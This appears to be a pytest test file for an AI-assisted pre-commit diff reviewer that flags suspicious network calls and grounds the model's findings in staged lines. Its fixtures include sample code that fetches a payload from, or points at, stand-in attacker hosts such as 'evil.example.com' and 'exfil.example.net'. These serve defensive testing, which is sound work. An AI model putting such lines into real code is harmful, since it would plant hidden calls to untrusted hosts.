"""Diff reviewer — plumbing, grounding, and the paths that never reach a model.

Nothing here talks to a model server. The corpus gate in
`test_diff_review_corpus.py` covers whether the reviewer is any *good*; these
tests cover whether it is wired correctly.
"""

from __future__ import annotations

import json
import subprocess
from pathlib import Path

import pytest

from sentinel_ai.config import AIConfig, DiffReviewConfig, Settings
from sentinel_ai.decision_engine import EXIT_BLOCK, EXIT_PASS
from sentinel_ai.diff_review.client import DiffReviewClient, parse_diff_verdict
from sentinel_ai.diff_review.diff import StagedDiff, collect
from sentinel_ai.diff_review.engine import (
    _recompute,
    review_staged,
    run_diff_review,
)
from sentinel_ai.diff_review.grounding import added_lines, ground, normalise
from sentinel_ai.diff_review.models import (
    DiffCategory,
    DiffFinding,
    SkipReason,
    Verdict,
    append_log,
    log_record,
)
from sentinel_ai.gitdiff import git_dir, staged_unified_diff
from sentinel_ai.main import build_parser, main
from sentinel_ai.models import Severity


def git(repo: Path, *args: str) -> None:
    subprocess.run(["git", *args], cwd=repo, check=True, capture_output=True, text=True)


@pytest.fixture
def repo(tmp_path: Path) -> Path:
    root = tmp_path / "app"
    root.mkdir()
    git(root, "init")
    git(root, "config", "user.email", "test@example.local")
    git(root, "config", "user.name", "Test")
    git(root, "config", "commit.gpgsign", "false")
    return root


def stage(repo: Path, path: str, content: str) -> None:
    target = repo / path
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(content, encoding="utf-8", newline="\n")
    git(repo, "add", path)


def parse_args(*argv: str):
    return build_parser().parse_args(["diff-review", *argv])


SAMPLE_DIFF = """diff --git a/src/app.py b/src/app.py
index 000..111 100644
--- a/src/app.py
+++ b/src/app.py
@@ -10,3 +10,5 @@ def handler():
     existing = 1
-    removed_line = 2
+    payload = fetch("https://evil.example.com/x")
+    return payload
     trailing = 3
"""


class TestStagedDiff:
    def test_reads_initial_commit_without_head(self, repo: Path):
        """Criterion 1: a repo whose first commit has not landed still diffs."""
        stage(repo, "src/app.py", "print('hello')\n")
        diff = staged_unified_diff(repo)
        assert "src/app.py" in diff
        assert "+print('hello')" in diff

    def test_lockfiles_and_manifests_are_excluded(self, repo: Path):
        """Criterion 2: `check` owns dependencies; this layer must not re-read them."""
        stage(repo, "src/app.py", "value = 1\n")
        stage(repo, "package.json", '{"dependencies": {"left-pad": "1.0.0"}}\n')
        stage(repo, "package-lock.json", '{"lockfileVersion": 3}\n')

        staged = collect(repo)
        assert staged.files == ["src/app.py"]
        assert sorted(staged.excluded) == ["package-lock.json", "package.json"]
        assert "left-pad" not in staged.text

    def test_uv_lock_does_not_consume_the_diff_budget(self, repo: Path):
        """A regenerated `uv.lock` runs to six figures of bytes.

        While it went unrecognised it reached the model as if it were source,
        and one lock refresh was enough to push the diff past `max_diff_bytes`
        — costing the commit the review of the code changed alongside it.
        """
        stage(repo, "src/app.py", "value = 1\n")
        stage(repo, "uv.lock", 'version = 1\n[[package]]\nname = "x"\n' * 5_000)

        staged = collect(repo)
        assert staged.files == ["src/app.py"]
        assert staged.excluded == ["uv.lock"]
        assert staged.size_bytes < DiffReviewConfig().max_diff_bytes

    def test_manifest_only_change_is_empty(self, repo: Path):
        stage(repo, "package.json", '{"name": "app"}\n')
        assert collect(repo).is_empty

    def test_no_staged_changes_is_empty(self, repo: Path):
        git(repo, "commit", "--allow-empty", "-m", "init")
        assert collect(repo).is_empty


class TestGrounding:
    def test_added_lines_are_numbered_from_the_new_file(self):
        index = added_lines(SAMPLE_DIFF)
        assert index["src/app.py"] == [
            (11, '    payload = fetch("https://evil.example.com/x")'),
            (12, "    return payload"),
        ]

    def test_normalise_collapses_whitespace_only(self):
        assert normalise("  a\t\tb  ") == "a b"
        assert normalise("Https://X") == "Https://X"

    def test_exact_snippet_is_kept(self):
        finding = DiffFinding(
            c=DiffCategory.NETWORK,
            s=Severity.HIGH,
            file="src/app.py",
            line=11,
            snip='fetch("https://evil.example.com/x")',
        )
        kept, dropped = ground([finding], SAMPLE_DIFF)
        assert dropped == 0
        assert kept[0].line == 11

    def test_reindented_snippet_still_matches(self):
        """The reason grounding normalises: models reflow what they quote."""
        finding = DiffFinding(
            c=DiffCategory.NETWORK,
            s=Severity.HIGH,
            file="src/app.py",
            line=11,
            snip='payload   =   fetch("https://evil.example.com/x")',
        )
        kept, dropped = ground([finding], SAMPLE_DIFF)
        assert dropped == 0
        assert len(kept) == 1

    def test_wrong_line_number_is_corrected_not_dropped(self):
        finding = DiffFinding(
            c=DiffCategory.NETWORK,
            s=Severity.HIGH,
            file="src/app.py",
            line=99,
            snip="return payload",
        )
        kept, dropped = ground([finding], SAMPLE_DIFF)
        assert dropped == 0
        assert kept[0].line == 12

    def test_hallucinated_snippet_is_dropped(self):
        finding = DiffFinding(
            c=DiffCategory.NETWORK,
            s=Severity.CRITICAL,
            file="src/app.py",
            line=11,
            snip='fetch("https://never-in-the-diff.example")',
        )
        kept, dropped = ground([finding], SAMPLE_DIFF)
        assert kept == []
        assert dropped == 1

    def test_removed_line_is_not_grounded(self):
        """A `-` line is not something the commit adds."""
        finding = DiffFinding(
            c=DiffCategory.NETWORK,
            s=Severity.HIGH,
            file="src/app.py",
            line=11,
            snip="removed_line = 2",
        )
        kept, dropped = ground([finding], SAMPLE_DIFF)
        assert kept == []
        assert dropped == 1

    def test_unknown_file_is_dropped(self):
        finding = DiffFinding(
            c=DiffCategory.WATERMARK,
            s=Severity.LOW,
            file="src/other.py",
            line=1,
            snip="return payload",
        )
        _, dropped = ground([finding], SAMPLE_DIFF)
        assert dropped == 1


class TestParseDiffVerdict:
    def test_minimal_schema(self):
        content = json.dumps(
            {
                "v": "notice",
                "f": [
                    {
                        "c": "network",
                        "s": "high",
                        "file": "src/app.py",
                        "line": 11,
                        "snip": "fetch(",
                    }
                ],
            }
        )
        verdict, malformed = parse_diff_verdict(content)
        assert malformed == 0
        assert verdict.verdict is Verdict.NOTICE
        assert verdict.findings[0].category is DiffCategory.NETWORK
        assert verdict.findings[0].severity is Severity.HIGH

    def test_empty_findings_is_a_pass(self):
        verdict, malformed = parse_diff_verdict('{"v":"pass","f":[]}')
        assert verdict.verdict is Verdict.PASS
        assert verdict.findings == []
        assert malformed == 0

    def test_unknown_severity_lands_on_medium(self):
        content = json.dumps(
            {
                "v": "notice",
                "f": [
                    {
                        "c": "watermark",
                        "s": "spicy",
                        "file": "a.py",
                        "line": 1,
                        "snip": "x",
                    }
                ],
            }
        )
        verdict, _ = parse_diff_verdict(content)
        assert verdict.findings[0].severity is Severity.MEDIUM

    def test_out_of_scope_category_is_counted_malformed(self):
        content = json.dumps(
            {
                "v": "notice",
                "f": [
                    {
                        "c": "secrets",
                        "s": "high",
                        "file": "a.py",
                        "line": 1,
                        "snip": "x",
                    },
                    {
                        "c": "network",
                        "s": "low",
                        "file": "a.py",
                        "line": 2,
                        "snip": "y",
                    },
                ],
            }
        )
        verdict, malformed = parse_diff_verdict(content)
        assert malformed == 1
        assert len(verdict.findings) == 1

    def test_markdown_fence_is_stripped(self):
        verdict, _ = parse_diff_verdict('```json\n{"v":"pass","f":[]}\n```')
        assert verdict.verdict is Verdict.PASS


class TestVerdictRecompute:
    def test_no_findings_passes(self):
        assert _recompute([]) is Verdict.PASS

    def test_critical_blocks(self):
        finding = DiffFinding(
            c=DiffCategory.NETWORK,
            s=Severity.CRITICAL,
            file="a.py",
            line=1,
            snip="x",
        )
        assert _recompute([finding]) is Verdict.BLOCK

    @pytest.mark.parametrize("severity", [Severity.LOW, Severity.MEDIUM, Severity.HIGH])
    def test_below_critical_only_notices(self, severity: Severity):
        finding = DiffFinding(
            c=DiffCategory.NETWORK, s=severity, file="a.py", line=1, snip="x"
        )
        assert _recompute([finding]) is Verdict.NOTICE


class TestLogging:
    def test_append_writes_one_line_per_run(self, tmp_path: Path):
        path = tmp_path / "nested" / "ai-review.jsonl"
        append_log(path, {"v": "pass"})
        append_log(path, {"v": "notice"})
        lines = path.read_text(encoding="utf-8").strip().splitlines()
        assert [json.loads(line)["v"] for line in lines] == ["pass", "notice"]

    def test_unwritable_path_does_not_raise(self, tmp_path: Path):
        """A broken trial log must never be able to fail a commit."""
        blocker = tmp_path / "blocker"
        blocker.write_text("not a directory", encoding="utf-8")
        append_log(blocker / "ai-review.jsonl", {"v": "pass"})

    def test_log_lands_in_the_git_dir(self, repo: Path):
        """Criterion 6: resolved via `git rev-parse`, not `root / '.git'`."""
        stage(repo, "src/app.py", "value = 1\n")
        assert run_diff_review(parse_args("--repo", str(repo), "--no-ai")) == EXIT_PASS

        log = git_dir(repo) / "ai-review.jsonl"
        assert log.is_file()
        record = json.loads(log.read_text(encoding="utf-8").strip())
        assert record["ai_skipped"] == "no_ai"
        assert record["reason"] == "skipped: no_ai"
        assert record["f"] == []

    def test_log_recording_off_writes_nothing(self, repo: Path, monkeypatch):
        monkeypatch.setattr(
            Settings, "load", classmethod(lambda cls: _settings(log_recording=False))
        )
        stage(repo, "src/app.py", "value = 1\n")
        assert run_diff_review(parse_args("--repo", str(repo), "--no-ai")) == EXIT_PASS
        assert not (git_dir(repo) / "ai-review.jsonl").exists()

    def test_block_record_includes_reason_and_findings(self):
        finding = DiffFinding(
            c=DiffCategory.NETWORK,
            s=Severity.CRITICAL,
            file="src/app.py",
            line=1,
            snip='url = "https://evil.example.com"',
        )
        record = log_record(
            verdict=Verdict.BLOCK,
            grounded=1,
            dropped=0,
            elapsed_ms=12,
            diff_bytes=100,
            skipped=None,
            findings=[finding],
        )
        assert record["v"] == "block"
        assert record["s"] == "critical"
        assert record["reason"] == "block: 1 finding(s) (critical network src/app.py:1)"
        assert record["f"] == [finding.as_wire()]


class TestEngineNonModelPaths:
    def test_no_ai_runs_the_pipeline_and_logs(self, repo: Path, capsys):
        stage(repo, "src/app.py", "value = 1\n")
        code = run_diff_review(parse_args("--repo", str(repo), "--no-ai", "--json"))
        assert code == EXIT_PASS

        payload = json.loads(capsys.readouterr().out)
        assert payload["v"] == "pass"
        assert payload["ai_skipped"] == "no_ai"

    def test_dry_run_writes_no_log(self, repo: Path):
        stage(repo, "src/app.py", "value = 1\n")
        assert run_diff_review(parse_args("--repo", str(repo), "--dry-run")) == EXIT_PASS
        assert not (git_dir(repo) / "ai-review.jsonl").exists()

    def test_empty_diff_records_no_reviewable_diff(self, repo: Path, capsys):
        git(repo, "commit", "--allow-empty", "-m", "init")
        code = run_diff_review(parse_args("--repo", str(repo), "--json"))
        assert code == EXIT_PASS
        assert json.loads(capsys.readouterr().out)["ai_skipped"] == "no_reviewable_diff"

    def test_oversized_diff_skips_the_model(self, repo: Path, capsys, monkeypatch):
        """Skip, never truncate: a cut diff hides findings behind grounding."""
        monkeypatch.setattr(
            Settings, "load", classmethod(lambda cls: _settings(max_diff_bytes=10))
        )
        stage(repo, "src/app.py", "value = 1\n" * 50)
        code = run_diff_review(parse_args("--repo", str(repo), "--json"))
        assert code == EXIT_PASS
        assert json.loads(capsys.readouterr().out)["ai_skipped"] == "diff_too_large"


class TestEngineModelPaths:
    def test_grounded_critical_blocks(self, repo: Path, capsys, httpx_mock, monkeypatch):
        monkeypatch.setattr(Settings, "load", classmethod(lambda cls: _settings()))
        stage(repo, "src/app.py", 'url = "https://evil.example.com"\n')
        _mock_reply(
            httpx_mock,
            {
                "v": "block",
                "f": [
                    {
                        "c": "network",
                        "s": "critical",
                        "file": "src/app.py",
                        "line": 1,
                        "snip": 'url = "https://evil.example.com"',
                    }
                ],
            },
        )

        assert run_diff_review(parse_args("--repo", str(repo), "--json")) == EXIT_BLOCK
        payload = json.loads(capsys.readouterr().out)
        assert payload["v"] == "block"
        assert payload["drop"] == 0

    def test_ungrounded_critical_does_not_block(
        self, repo: Path, capsys, httpx_mock, monkeypatch
    ):
        """Criterion 5 in reverse: evidence decides, not the model's verdict."""
        monkeypatch.setattr(Settings, "load", classmethod(lambda cls: _settings()))
        stage(repo, "src/app.py", "value = 1\n")
        _mock_reply(
            httpx_mock,
            {
                "v": "block",
                "f": [
                    {
                        "c": "network",
                        "s": "critical",
                        "file": "src/app.py",
                        "line": 1,
                        "snip": "requests.get('http://not-here.example')",
                    }
                ],
            },
        )

        assert run_diff_review(parse_args("--repo", str(repo), "--json")) == EXIT_PASS
        payload = json.loads(capsys.readouterr().out)
        assert payload["v"] == "pass"
        assert payload["drop"] == 1

    def test_model_unavailable_fails_open(
        self, repo: Path, capsys, httpx_mock, monkeypatch
    ):
        """Criterion 10: an outage must not freeze commits."""
        monkeypatch.setattr(Settings, "load", classmethod(lambda cls: _settings()))
        stage(repo, "src/app.py", "value = 1\n")
        httpx_mock.add_response(status_code=503, text="upstream down")

        assert run_diff_review(parse_args("--repo", str(repo), "--json")) == EXIT_PASS
        payload = json.loads(capsys.readouterr().out)
        assert payload["ai_skipped"] == "model_unavailable"

    def test_strict_blocks_when_model_unavailable(
        self, repo: Path, httpx_mock, monkeypatch
    ):
        monkeypatch.setattr(Settings, "load", classmethod(lambda cls: _settings()))
        stage(repo, "src/app.py", "value = 1\n")
        httpx_mock.add_response(status_code=503, text="upstream down")

        code = run_diff_review(parse_args("--repo", str(repo), "--strict", "--json"))
        assert code == EXIT_BLOCK


class TestCheckIntegration:
    """`check` is what the Husky hook runs, so this is the real delivery path.

    There is no `install-diff-hook`: the layer reaches a machine when the CLI
    is updated, because the hook line in every repo already says `check`.
    """

    def _check(self, repo: Path, *extra: str) -> int:
        return main(["check", "--repo", str(repo), "--no-trivy", *extra])

    def test_runs_on_a_commit_with_no_dependency_change(
        self, repo: Path, httpx_mock, monkeypatch
    ):
        """The common commit — and the one this layer exists for."""
        monkeypatch.setattr(Settings, "load", classmethod(lambda cls: _settings()))
        stage(repo, "src/app.py", 'url = "https://evil.example.com"\n')
        _mock_reply(
            httpx_mock,
            {
                "v": "notice",
                "f": [
                    {
                        "c": "network",
                        "s": "high",
                        "file": "src/app.py",
                        "line": 1,
                        "snip": 'url = "https://evil.example.com"',
                    }
                ],
            },
        )

        assert self._check(repo) == EXIT_PASS
        record = json.loads(
            (git_dir(repo) / "ai-review.jsonl").read_text(encoding="utf-8").strip()
        )
        assert record["v"] == "notice"
        assert record["n"] == 1
        assert record["s"] == "high"
        assert "network src/app.py:1" in record["reason"]
        assert record["f"][0]["c"] == "network"

    def test_grounded_critical_fails_the_check(self, repo: Path, httpx_mock, monkeypatch):
        monkeypatch.setattr(Settings, "load", classmethod(lambda cls: _settings()))
        stage(repo, "src/app.py", 'key = "https://exfil.example.net"\n')
        _mock_reply(
            httpx_mock,
            {
                "v": "block",
                "f": [
                    {
                        "c": "network",
                        "s": "critical",
                        "file": "src/app.py",
                        "line": 1,
                        "snip": 'key = "https://exfil.example.net"',
                    }
                ],
            },
        )

        assert self._check(repo) == EXIT_BLOCK
        record = json.loads(
            (git_dir(repo) / "ai-review.jsonl").read_text(encoding="utf-8").strip()
        )
        assert record["v"] == "block"
        assert record["s"] == "critical"
        assert record["reason"] == "block: 1 finding(s) (critical network src/app.py:1)"
        assert record["f"][0]["snip"] == 'key = "https://exfil.example.net"'

    def test_dependency_only_commit_makes_no_model_call(
        self, repo: Path, httpx_mock, monkeypatch
    ):
        """Manifests are filtered out, so this costs nothing extra."""
        monkeypatch.setattr(Settings, "load", classmethod(lambda cls: _settings()))
        stage(repo, "package.json", '{"dependencies": {"left-pad": "1.0.0"}}\n')

        self._check(repo)
        assert httpx_mock.get_requests() == []

    def test_range_mode_does_not_review_the_index(
        self, repo: Path, httpx_mock, monkeypatch
    ):
        """`--range` asks a different question and does not read the index."""
        monkeypatch.setattr(Settings, "load", classmethod(lambda cls: _settings()))
        stage(repo, "src/app.py", "value = 1\n")
        git(repo, "commit", "-m", "first")
        git(repo, "commit", "--allow-empty", "-m", "second")

        self._check(repo, "--range", "HEAD~1..HEAD")
        assert httpx_mock.get_requests() == []

    def test_internal_error_cannot_fail_the_commit(self, repo: Path, monkeypatch):
        """This now runs for the whole team; a bug here must cost a warning."""
        monkeypatch.setattr(Settings, "load", classmethod(lambda cls: _settings()))
        monkeypatch.setattr(
            "sentinel_ai.diff_review.engine.review_staged",
            lambda *a, **k: (_ for _ in ()).throw(RuntimeError("boom")),
        )
        stage(repo, "src/app.py", "value = 1\n")

        assert self._check(repo) == EXIT_PASS

    def test_disabled_config_makes_no_model_call(
        self, repo: Path, httpx_mock, monkeypatch
    ):
        monkeypatch.setattr(
            Settings, "load", classmethod(lambda cls: _settings(enabled=False))
        )
        stage(repo, "src/app.py", "value = 1\n")

        assert self._check(repo) == EXIT_PASS
        assert httpx_mock.get_requests() == []


class TestBudgetIsolation:
    def test_budgets_live_with_the_feature_not_the_connection(self):
        """`[ai]` carries connection details only; the budget belongs here."""
        settings = Settings()
        assert settings.diff_review.max_output_tokens == 256
        assert settings.diff_review.timeout_seconds == 12.0
        assert not hasattr(settings.ai, "max_output_tokens")
        assert not hasattr(settings.ai, "timeout_seconds")

    def test_ai_enabled_is_the_master_switch(self, repo: Path):
        """Turning off `[ai]` must silence every AI stage, not just some.

        Takes a tmp repo deliberately: `review_staged` appends to the trial log
        in the given repository, and `Path(".")` wrote those lines into whatever
        checkout pytest happened to run from.
        """
        settings = _settings()
        settings.ai.enabled = False
        outcome = review_staged(repo, settings, staged=StagedDiff(text="x"))
        assert outcome.skipped is SkipReason.DISABLED

    def test_bundled_toml_populates_the_section(self):
        """Without a model on `Settings`, `[diff_review]` would vanish silently."""
        settings = Settings.load()
        assert settings.diff_review.max_diff_bytes == 40_000
        assert settings.diff_review.log_file == "ai-review.jsonl"
        assert settings.diff_review.log_recording is True

    def test_env_overrides(self, monkeypatch):
        monkeypatch.setenv("SENTINEL_DIFF_REVIEW_MAX_TOKENS", "512")
        monkeypatch.setenv("SENTINEL_DIFF_REVIEW_TIMEOUT", "3.5")
        monkeypatch.setenv("SENTINEL_DIFF_REVIEW_ENABLED", "false")
        settings = Settings.load()
        assert settings.diff_review.max_output_tokens == 512
        assert settings.diff_review.timeout_seconds == 3.5
        assert settings.diff_review.enabled is False

    def test_client_uses_the_diff_review_budget(self, httpx_mock):
        _mock_reply(httpx_mock, {"v": "pass", "f": []})
        client = DiffReviewClient(AIConfig(), DiffReviewConfig(max_output_tokens=256))
        client.review("diff --git a/a.py b/a.py\n")

        sent = json.loads(httpx_mock.get_requests()[0].content)
        assert sent["max_tokens"] == 256


class TestCLI:
    def test_takes_no_positional_argument(self):
        """Phase 1 adds a `stats` subcommand; a positional would collide."""
        with pytest.raises(SystemExit):
            parse_args("COMMIT_EDITMSG")

    def test_diff_review_does_not_fall_through_to_check(self, monkeypatch):
        """Without its own dispatch branch, `main` would run `_check` instead."""
        import sentinel_ai.diff_review.engine as engine

        seen: list[str] = []
        monkeypatch.setattr(
            engine, "run_diff_review", lambda args: seen.append(args.command) or EXIT_PASS
        )
        monkeypatch.setattr(
            "sentinel_ai.main._check",
            lambda args: pytest.fail("diff-review fell through to check"),
        )

        assert main(["diff-review", "--dry-run"]) == EXIT_PASS
        assert seen == ["diff-review"]


def _settings(**overrides) -> Settings:
    settings = Settings()
    settings.ai.base_url = "http://model.invalid/v1"
    settings.diff_review = DiffReviewConfig(**overrides)
    return settings


def _mock_reply(httpx_mock, payload: dict) -> None:
    httpx_mock.add_response(
        json={
            "choices": [
                {
                    "message": {"content": json.dumps(payload)},
                    "finish_reason": "stop",
                }
            ]
        }
    )
